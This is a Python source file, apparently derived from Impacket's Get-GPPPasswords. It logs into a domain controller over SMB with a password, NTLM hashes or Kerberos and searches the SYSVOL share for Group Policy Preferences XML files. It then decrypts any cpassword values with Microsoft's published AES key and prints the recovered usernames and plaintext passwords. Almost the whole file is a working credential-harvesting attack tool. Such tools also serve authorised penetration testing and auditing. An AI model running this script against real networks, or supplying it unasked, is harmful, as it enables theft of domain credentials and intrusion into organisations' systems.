#!/usr/bin/env python3
'''
# Description: Python script for extracting and decrypting Group Policy Preferences passwords,
# using Impacket's lib, and using streams for carving files instead of mounting shares
#
# Authors:
#  Remi Gascou (@podalirius_)
#  Charlie Bromberg (@_nwodtuhs)
'''


import argparse
import logging
import base64
import sys
import re
import traceback
from xml.dom import minidom
from io import BytesIO
from getpass import getpass
import chardet

from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

from impacket import version
from impacket.examples import logger
from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError


class GetGPPasswords(object):
    """docstring for GetGPPasswords."""

    def __init__(self, smb, share):
        super(GetGPPasswords, self).__init__()
        self.smb = smb
        self.share = share

    def list_shares(self):
        logging.info("Listing shares...")
        resp = self.smb.listShares()
        shares = []
        for k in range(len(resp)):
            shares.append(resp[k]['shi1_netname'][:-1])
            print(f"  - {resp[k]['shi1_netname'][:-1]}")
        print()

    def find_cpasswords(self, base_dir, extension='xml'):
        print(f"Searching *.{extension} files...")
        # Breadth-first search algorithm to recursively find .extension files
        files = []
        searchdirs = [base_dir + '/']
        while len(searchdirs) != 0:
            next_dirs = []
            for sdir in searchdirs:
                print(f'Searching in {sdir} ')
                for sharedfile in self.smb.listPath(self.share, sdir + '*', password=None):
                    if sharedfile.get_longname() not in ['.', '..']:
                        if sharedfile.is_directory():
                            print(f'Found directory {sharedfile.get_longname()}/')
                            next_dirs.append(sdir + sharedfile.get_longname() + '/')
                        else:
                            if sharedfile.get_longname().endswith('.' + extension):
                                print(f'Found matching file {(sdir + sharedfile.get_longname())}')
                                results = self.parse(sdir + sharedfile.get_longname())
                                if len(results) != 0:
                                    self.show(results)
                                    files.append({"filename": sdir + sharedfile.get_longname(), "results": results})
                            else:
                                print(f'Found file {sharedfile.get_longname()}')
            searchdirs = next_dirs
            print(f'Next iteration with {len(next_dirs)} folders.')
        return files

    def parse(self, filename):
        results = []
        filename = filename.replace('/', '\\')
        fh = BytesIO()
        try:
            # opening the files in streams instead of mounting shares allows for running the script from
            # unprivileged containers
            self.smb.getFile(self.share, filename, fh.write)
        except SessionError as e:
            logging.error(e)
            return results
        except Exception as e:
            print(e)
            return
            #raise
        output = fh.getvalue()
        encoding = chardet.detect(output)["encoding"]
        if encoding != None:
            filecontent = output.decode(encoding).rstrip()
            if 'cpassword' in filecontent:
                print(filecontent)
                try:
                    root = minidom.parseString(filecontent)
                    properties_list = root.getElementsByTagName("Properties")
                    # function to get attribute if it exists, returns "" if empty
                    read_or_empty = lambda element, attribute: (
                        element.getAttribute(attribute) if element.getAttribute(attribute) != None else "")
                    for properties in properties_list:
                        results.append({
                            'newname': read_or_empty(properties, 'newName'),
                            'changed': read_or_empty(properties.parentNode, 'changed'),
                            'cpassword': read_or_empty(properties, 'cpassword'),
                            'password': self.decrypt_password(read_or_empty(properties, 'cpassword')),
                            'username': read_or_empty(properties, 'userName'),
                            'file': filename
                        })
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        traceback.print_exc()
                    print(str(e))
                fh.close()
            else:
                print(f"No cpassword was found in {filename}")
        else:
            print("Output cannot be correctly decoded, are you sure the text is readable ?")
            fh.close()
        return results

    def decrypt_password(self, pw_enc_b64):
        if len(pw_enc_b64) != 0:
            # thank you MS for publishing the key :) (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
            key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20' \
                  b'\x9b\x09\xa4\x33\xb6\x6c\x1b'
            # thank you MS for using a fixed IV :)
            iv = b'\x00' * 16
            pad = len(pw_enc_b64) % 4
            if pad == 1:
                pw_enc_b64 = pw_enc_b64[:-1]
            elif pad == 2 or pad == 3:
                pw_enc_b64 += '=' * (4 - pad)
            pw_enc = base64.b64decode(pw_enc_b64)
            ctx = AES.new(key, AES.MODE_CBC, iv)
            pw_dec = unpad(ctx.decrypt(pw_enc), ctx.block_size)
            return pw_dec.decode('utf-16-le')
        else:
            print("cpassword is empty, cannot decrypt anything")
            return ""

    def show(self, results):
        for result in results:
            print(f"NewName\t: {result['newname']}")
            print(f"Changed\t: {result['changed']}")
            print(f"Username\t: {result['username']}")
            print(f"Password\t: {result['password']}")
            print(f"File\t: {result['file']} \n")


def parse_args():
    parser = argparse.ArgumentParser(add_help=True,
                                     description='Group Policy Preferences passwords finder and decryptor')
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument("-share", type=str, required=False, default="SYSVOL", help="SMB Share")
    parser.add_argument("-base-dir", type=str, required=False, default="/", help="Directory to search in (Default: /)")
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


def parse_target(args):
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        args.target).groups('')

    # In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if args.target_ip is None:
        args.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and (username != '' or username !='guest') and args.hashes is None and args.no_pass is False and args.aesKey is None:

        password = getpass("Password:")

    if args.aesKey is not None:
        args.k = True

    if args.hashes is not None:
        lmhash, nthash = args.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    return domain, username, password, address, lmhash, nthash


def init_logger(args):
    # Init the example's logger theme and debug level
    logger.init(args.ts)
    if args.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        print(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)


def init_smb_session(domain, username, password, address, port, lmhash, nthash, aesKey, kerberos):
    # kerberos = args.k
    # aesKey = arg
    # smbClient = SMBConnection(address, args.target_ip, sess_port=int(args.port))
    smbClient = SMBConnection(address, address, sess_port=int(port))
    dialect = smbClient.getDialect()
    if dialect == SMB_DIALECT:
        print("SMBv1 dialect used")
    elif dialect == SMB2_DIALECT_002:
        print("SMBv2.0 dialect used")
    elif dialect == SMB2_DIALECT_21:
        print("SMBv2.1 dialect used")
    else:
        print("SMBv3.0 dialect used")
    # if args.k is True:
    if kerberos is True:
        # smbClient.kerberosLogin(username, password, domain, lmhash, nthash, args.aesKey, args.dc_ip)
        smbClient.kerberosLogin(username, password, domain, lmhash, nthash, aesKey, address)
    else:
        smbClient.login(username, password, domain, lmhash, nthash)
    if smbClient.isGuestSession() > 0:
        print("GUEST Session Granted")
    else:
        print("USER Session Granted")
    return smbClient


def scan(username, password, domain, target_ip, port, lmhash, nthash, share="SYSVOL", base_dir="/", aesKey=None, kerberos=None):
    if lmhash is None:
        lmhash = ''
    if nthash is None:
        nthash = ''
    try:
        smbClient = init_smb_session(domain, username, password, target_ip, port, lmhash, nthash, aesKey, kerberos)
        g = GetGPPasswords(smbClient, share)
        g.list_shares()
        list_files = g.find_cpasswords(base_dir)
        if list_files:
            return {"ip":target_ip,"port":port,"vulnerableToGPPAbuse":True, "username":username}
        else:
            return {"ip":target_ip,"port":port,"vulnerableToGPPAbuse":False, "username":username}
    except Exception as e:
        print(f"Exception: {e}.")

def getgpp_creds(username, password, domain, target_ip, port, lmhash, nthash, share="SYSVOL", base_dir="/", aesKey=None, kerberos=None):
    if lmhash is None:
        lmhash = ''
    if nthash is None:
        nthash = ''
    try:
        smbClient = init_smb_session(domain, username, password, target_ip, port, lmhash, nthash, aesKey, kerberos)
        g = GetGPPasswords(smbClient, share)
        g.list_shares()
        list_files = g.find_cpasswords(base_dir)
        if list_files:
            return list_files
        else:
            return None
    except Exception as e:
        print(f"Exception: {e}.")

if __name__ == '__main__':
    args = parse_args()
    init_logger(args)
    domain, username, password, address, lmhash, nthash = parse_target(args)
    try:
        print(f"Scanning for GPP Abuse attack on domain:{domain}, IP: {address}, and username: {username}...")
        smbClient = init_smb_session(domain, username, password, address, args.port, lmhash, nthash, args.aesKey, args.k)
        g = GetGPPasswords(smbClient, args.share)
        g.list_shares()
        list_files = g.find_cpasswords(args.base_dir)
        if list_files:
            results = {"ip":address,"port":445,"vulnerableToGPPAbuse":True, "username":username}
        else:
            results = {"ip":address,"port":445,"vulnerableToGPPAbuse":False, "username":username}
        if results:
            results_csv = ''.join([f"{results[i]}," if i != list(results)[-1] else f"{results[i]}" for i in results])
            print(f"Results = {results_csv}")
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        logging.error(str(e))
